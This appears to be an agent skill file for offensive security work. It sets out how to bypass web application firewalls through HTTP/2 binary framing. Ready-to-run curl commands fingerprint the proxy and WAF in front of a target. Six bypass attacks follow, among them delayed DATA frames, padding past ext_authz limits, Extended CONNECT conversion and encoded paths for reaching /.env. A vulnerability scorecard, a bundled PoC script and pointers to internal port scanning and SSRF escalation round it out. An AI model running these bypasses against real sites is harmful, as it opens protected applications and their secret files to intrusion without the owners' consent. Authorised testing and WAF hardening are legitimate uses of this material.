---
name: h2-waf-bypass
description: Bypass WAF body/path inspection via HTTP/2 binary framing — delayed DATA frames blind out-of-process WAFs, body size truncation evades ext_authz limits, Extended CONNECT converts methods past ACLs. Includes black-box proxy+WAF fingerprinting. Use when WAF blocks payloads over HTTP/1.1 but target supports HTTP/2, or when standard 403-bypass and parser-differential techniques fail.
---

# H2 WAF Bypass via Binary Framing

HTTP/2 splits requests into binary frames: method/path arrive in HEADERS frames, body arrives in DATA frames. Out-of-process WAFs (SPOA, ext_authz, ForwardAuth) evaluate at HEADERS time. If DATA arrives later, the body is invisible to the WAF but reaches the backend.

In-process WAFs (libmodsecurity3 in nginx) buffer the full request before evaluation. These are NOT vulnerable to frame timing attacks.

## When to Use

- WAF blocks your payload over HTTP/1.1 (403 on body content, path, or method)
- Target accepts HTTP/2 (check ALPN or force H2 connection preface)
- Standard `403-bypass` path/header tricks exhausted
- `parser-differential-bypass` content-type tricks exhausted
- `h2c-websocket-smuggling` upgrade path not available

## Phase 1: Proxy + WAF Fingerprinting

Identify the proxy and WAF architecture before choosing an attack. Run the bundled PoC (`scripts/h2_waf_bypass.py`) or manually fingerprint.

### Signal 1: Response Headers

```bash
curl -sk -D- https://TARGET/ -o /dev/null 2>&1 | grep -iE "^(server|via|alt-svc|x-envoy)"
```

| Header | Proxy |
|--------|-------|
| `server: envoy` or `x-envoy-*` | Envoy |
| `via: 1.0 Caddy` or `via: 2.0 Caddy` | Caddy |
| `server: nginx` | nginx |
| `server: Apache` | Apache |
| `alt-svc: h3=` (no other proxy signals) | Caddy (medium confidence) |

### Signal 2: Error Pages

```bash
curl -sk https://TARGET/nonexistent-fptest-xyz | head -5
```

- `<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">` = Apache
- `Request forbidden by administrative rules` = HAProxy
- Custom JSON error with `ext_authz` reference = Envoy

### Signal 3: TLS Certificate CN

```bash
curl -skv https://TARGET/ 2>&1 | grep "subject:"
```

- `CN=TRAEFIK DEFAULT CERT` = Traefik (default config only)

### Signal 4: ALPN + Forced H2 (HAProxy Signature)

```bash
curl -sk --http2 -D- https://TARGET/ -o /dev/null 2>&1 | grep -i "HTTP/2"
```

HAProxy accepts HTTP/2 even when configured `alpn http/1.1`. The H2 multiplexer activates on the connection preface regardless of ALPN negotiation. If ALPN negotiates `http/1.1` but H2 works anyway, it is HAProxy. No other tested proxy exhibits this behavior.

### Signal 5: WAF Architecture

```bash
# Test path-based WAF
curl -sk -o /dev/null -w "%{http_code}" https://TARGET/.env

# Test body-based WAF (form-urlencoded)
curl -sk -o /dev/null -w "%{http_code}" -X POST \
  -d '{"jsonrpc":"2.0"}' \
  -H "Content-Type: application/x-www-form-urlencoded" https://TARGET/

# Test body-based WAF (JSON) — if form blocked but JSON passes, content-type gap exists
curl -sk -o /dev/null -w "%{http_code}" -X POST \
  -d '{"jsonrpc":"2.0"}' \
  -H "Content-Type: application/json" https://TARGET/
```

| Path 403 | Body (form) 403 | Body (JSON) 403 | WAF Type |
|----------|-----------------|-----------------|----------|
| Yes | Yes | Yes | In-process (modsecurity/libmodsecurity3) |
| Yes | Yes | No | In-process with JSON gap (mod_security2, Coraza) |
| No | Yes | Yes | Out-of-process, body-only (ext_authz) |
| Yes | No | No | Out-of-process, path-only (ForwardAuth) |
| No | No | No | No WAF or WAF not triggered |

### Fingerprint → Attack Router

```
Proxy identified + WAF type determined
  ├── HAProxy + out-of-process (Coraza SPOA)
  │     ├── Attack 1: H2 Body Timing (delayed DATA frame)
  │     ├── Attack 2: Body Size Truncation
  │     └── Attack 3: Extended CONNECT method conversion
  ├── Envoy + ext_authz
  │     ├── Attack 2: Body Size Truncation (64KB boundary)
  │     └── Check: Missing path inspection (no path rules = direct access)
  ├── Traefik + ForwardAuth
  │     ├── Attack 4: ForwardAuth body stripping (body never forwarded)
  │     └── Attack 5: Path normalization bypass
  ├── Apache + mod_security2
  │     └── Attack 6: JSON content-type gap
  ├── Caddy + Coraza
  │     ├── Attack 5: Path normalization bypass
  │     └── Attack 6: JSON content-type gap
  └── nginx + libmodsecurity3
        └── No known H2 frame-level bypasses (buffers full request)
```

## Phase 2: Exploitation

### Attack 1: H2 Body Timing (Delayed DATA Frame)

**Target:** Out-of-process WAFs (HAProxy+SPOA, Envoy+ext_authz)

```
T+0ms:   HEADERS frame → WAF check fires (body empty) → verdict: ALLOW
T+500ms: DATA frame    → forwarded to backend (WAF already decided)
```

**Key sequence:**
1. Send HEADERS (`:method POST`, `:path /`, `content-type: application/x-www-form-urlencoded`) with `END_HEADERS` but NOT `END_STREAM`
2. `time.sleep(0.5)` — WAF fires here on out-of-process architectures
3. Send DATA frame with malicious body + `END_STREAM`

**Verdict:** H1 POST returns 403 but H2 split delivery returns 200 → WAF body blind spot confirmed.

**Automated:** `python3 scripts/h2_waf_bypass.py TARGET 443 all`

### Attack 2: Body Size Truncation

**Target:** Envoy ext_authz with `max_request_bytes` (default 64KB) + `allow_partial_message: true`

ext_authz only forwards the first N bytes to the auth service. Payload after that boundary is invisible to the WAF.

**Test:**
1. Baseline: small body with blocked payload → expect 403
2. Attack: 64KB padding (`b'A' * 65536`) + same payload → if 200, WAF only saw padding
3. If 64KB fails, try larger padding — limit is config-dependent

### Attack 3: Extended CONNECT Method Conversion

**Target:** HAProxy (RFC 8441 Extended CONNECT)

**Mechanism:** H2 CONNECT with `:protocol=websocket` pseudo-header converts to HTTP/1.1 `GET` + `Upgrade: websocket` during H2-to-H1 translation. Method ACLs blocking CONNECT never fire because the backend sees GET.

**H2 pseudo-headers sent:**
```
:method    = CONNECT
:protocol  = websocket
:path      = /
:scheme    = https
:authority = target.com
```

**Backend receives (H1):**
```http
GET / HTTP/1.1
Host: target.com
Upgrade: websocket
```

Method ACLs that block `CONNECT` or restrict methods to `GET/POST` see a `GET` request after translation.

### Attack 4: ForwardAuth Body Stripping

**Target:** Traefik v3 + ForwardAuth middleware

ForwardAuth forwards only headers — body is never sent to the auth service. Works over H1 and H2.

```bash
curl -sk -X POST -d '{"jsonrpc":"2.0"}' -H "Content-Type: application/json" https://TARGET/
curl -sk -X POST -d 'cmd=exec&target=internal' -H "Content-Type: application/json" https://TARGET/
```

### Attack 5: Path Normalization Bypass

**Target:** Traefik+ForwardAuth, Caddy+Coraza

**Mechanism:** WAF matches literal path strings (`/.env`). Proxy decodes URL-encoded paths before forwarding to backend. Encoded variants bypass string matching.

```bash
# Baseline (blocked)
curl -sk -o /dev/null -w "%{http_code}" https://TARGET/.env

# Bypass variants
curl -sk -o /dev/null -w "%{http_code}" https://TARGET/%2eenv
curl -sk -o /dev/null -w "%{http_code}" https://TARGET/.%65nv
curl -sk -o /dev/null -w "%{http_code}" https://TARGET/.e%6ev
curl -sk -o /dev/null -w "%{http_code}" https://TARGET/%2e%65%6e%76
curl -sk -o /dev/null -w "%{http_code}" https://TARGET/static/..%2f.env
curl -sk -o /dev/null -w "%{http_code}" https://TARGET/..%252f.env
```

If baseline returns 403 but any variant returns 200, path normalization bypass confirmed.

### Attack 6: JSON Content-Type Gap

**Target:** Apache+mod_security2, Caddy+Coraza

ModSecurity `REQUEST_BODY` variable only parses `application/x-www-form-urlencoded`. Same payload as `application/json` bypasses body-phase rules.

```bash
# Blocked (form-urlencoded)
curl -sk -o /dev/null -w "%{http_code}" -X POST \
  -d 'cmd=exec&target=internal' \
  -H "Content-Type: application/x-www-form-urlencoded" https://TARGET/

# Bypass (JSON)
curl -sk -o /dev/null -w "%{http_code}" -X POST \
  -d '{"cmd":"exec","target":"internal"}' \
  -H "Content-Type: application/json" https://TARGET/
```

## Bypass Scorecard

| Proxy | WAF | Body Timing | Body Size | Ext CONNECT | Path Norm | JSON Gap | ForwardAuth |
|-------|-----|:-----------:|:---------:|:-----------:|:---------:|:--------:|:-----------:|
| HAProxy 2.9 | Coraza SPOA | VULN | VULN | VULN | - | - | - |
| Envoy 1.32 | ext_authz | - | VULN | - | - | - | - |
| Traefik v3 | ForwardAuth | - | - | - | VULN | - | VULN |
| Apache | mod_security2 | - | - | - | - | VULN | - |
| Caddy | Coraza | - | - | - | VULN | VULN | - |
| **nginx** | **libmodsecurity3** | **-** | **-** | **-** | **-** | **-** | **-** |

nginx + libmodsecurity3 is the only tested configuration with zero bypasses.

## PoC Tool

Bundled at `scripts/h2_waf_bypass.py`. Zero dependencies — raw H2 frames from stdlib.

```bash
python3 scripts/h2_waf_bypass.py TARGET 443              # full pipeline
python3 scripts/h2_waf_bypass.py TARGET 443 fingerprint   # fingerprint only
python3 scripts/h2_waf_bypass.py TARGET 443 exploit        # exploit only
```

Proxy through Caido: modify `tls_connect()` or set `HTTPS_PROXY=http://localhost:8080`.

## Chain With

- **403-bypass** — exhaust HTTP/1.1 path/header tricks first, then escalate to H2 framing
- **h2c-websocket-smuggling** — if proxy forwards Upgrade headers, H2C may bypass ACLs entirely
- **h2-connect-internal-scan** — H2 CONNECT for internal port scanning after WAF bypass
- **parser-differential-bypass** — content-type and encoding differentials complement H2 attacks
- **blind-ssrf-chains** — once WAF is bypassed, escalate SSRF to proven impact
- **content-type-mime-diff** — overlaps with Attack 6 (JSON gap), deeper MIME differential coverage

## Rules

- **Fingerprint before attacking.** The proxy+WAF combination determines which attacks apply. Spraying all 6 against nginx wastes time.
- **H1 baseline first.** Always establish what the WAF blocks over HTTP/1.1 before testing H2 bypasses. The bypass is the delta.
- **nginx is hardened.** libmodsecurity3 buffers full requests. Do not waste cycles on H2 timing attacks against nginx.
- **ForwardAuth is body-blind by design.** This is not a bug in Traefik — it is how ForwardAuth works. Body inspection requires a different middleware architecture.
- **Body size truncation is config-dependent.** The 64KB default in ext_authz is common but not universal. Test with incrementally larger padding if 64KB fails.
- **Proxy through Caido.** All exploitation requests must go through `curl -x http://localhost:8080 -k` for evidence capture.

## Reference

- [CTBB Lab: WAF Bypasses via HTTP/2 Framing](https://lab.ctbb.show/research/h2-WAF-Bypasses) (Diyan Apostolov, June 2026)
- [Unified PoC Gist](https://gist.github.com/apostolovd/42a91d54ee27c50b46b15166d610b19a)
- [RFC 8441: Extended CONNECT](https://datatracker.ietf.org/doc/html/rfc8441)
- [RFC 9113: HTTP/2](https://datatracker.ietf.org/doc/html/rfc9113)
